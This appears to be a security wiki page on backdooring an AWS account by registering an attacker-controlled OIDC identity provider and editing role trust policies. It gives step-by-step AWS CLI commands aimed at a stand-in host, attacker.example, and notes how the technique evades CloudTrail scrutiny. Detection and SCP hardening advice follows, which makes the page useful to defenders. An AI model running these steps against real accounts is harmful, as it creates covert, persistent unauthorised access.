---
title: Rogue OIDC IdP persistence (AWS)
slug: aws-rogue-oidc-idp-persistence
---

> **TL;DR:** Register an attacker-controlled OIDC provider in the target account, point one or more role trust policies at it, and mint STS sessions on demand by signing your own JWTs — no access keys, no users, low CloudTrail noise.

## What it is
AWS lets accounts register external OIDC identity providers (`iam:CreateOpenIDConnectProvider`) so workloads like GitHub Actions, GitLab CI, or k8s can federate without long-lived keys. The control-plane only stores the issuer URL, audience, and TLS thumbprints — it trusts whatever JWTs the issuer signs. An attacker with `iam:CreateOpenIDConnectProvider` and `iam:UpdateAssumeRolePolicy` (or equivalent) can plant their own issuer, then call `sts:AssumeRoleWithWebIdentity` with attacker-signed tokens to assume any role whose trust policy they edited.

## Preconditions / where it applies
- Foothold principal with `iam:CreateOpenIDConnectProvider` (or pre-existing rogue provider already planted).
- `iam:UpdateAssumeRolePolicy` on at least one target role (or `iam:CreateRole`).
- Publicly reachable HTTPS endpoint to host `/.well-known/openid-configuration` and JWKS (commonly a free static-hosting site).

## Technique

1. Stand up a minimal OIDC issuer — generate an RSA keypair, publish JWKS, expose `/.well-known/openid-configuration`.
2. Register the provider in the target account:

```bash
aws iam create-open-id-connect-provider \
  --url https://attacker.example/oidc \
  --client-id-list "sts.amazonaws.com" \
  --thumbprint-list "$(openssl s_client -connect attacker.example:443 -servername attacker.example </dev/null 2>/dev/null \
       | openssl x509 -fingerprint -noout -sha1 | sed 's/.*=//;s/://g')"
```

3. Edit a juicy role's trust policy to allow `AssumeRoleWithWebIdentity` from this provider with an attacker-chosen `sub`/`aud` constraint.
4. Whenever you need creds, mint a JWT signed with your private key whose `iss`/`aud`/`sub` match the trust policy, then:

```bash
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::TARGET:role/Backdoored \
  --role-session-name oidc \
  --web-identity-token "$JWT"
```

No long-lived key exists in the account. CloudTrail shows `AssumeRoleWithWebIdentity` from `sts.amazonaws.com` — which most organisations whitelist for CI/CD. Compare with [[gha-oidc-sub-claim-wildcards]] for the legitimate-IdP analogue.

## Detection and defence
- Alert on `CreateOpenIDConnectProvider` and `UpdateOpenIDConnectProviderThumbprint` outside change windows — these are extremely rare in steady state.
- Inventory all OIDC providers and pin their issuer URLs against an allow-list (GitHub, your CI domain).
- Restrict `iam:CreateOpenIDConnectProvider`, `iam:UpdateAssumeRolePolicy`, `iam:CreateRole` to break-glass principals via SCP.
- Alert on `AssumeRoleWithWebIdentity` events where `userIdentity.identityProvider` is not in the allow-list.
- Treat unexpected `UpdateAssumeRolePolicy` events on production roles as P1.

## References
- [Offensive AI — RogueOIDC](https://www.offensai.com/blog/rogueoidc-aws-persistence-and-evasion-through-attacker-controlled-oidc-identity-provider) — original write-up
- [AWS — OIDC federation](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_oidc.html) — provider mechanics
- [HackTricks Cloud — AWS persistence](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-persistence/aws-iam-persistence.html) — related backdoor patterns
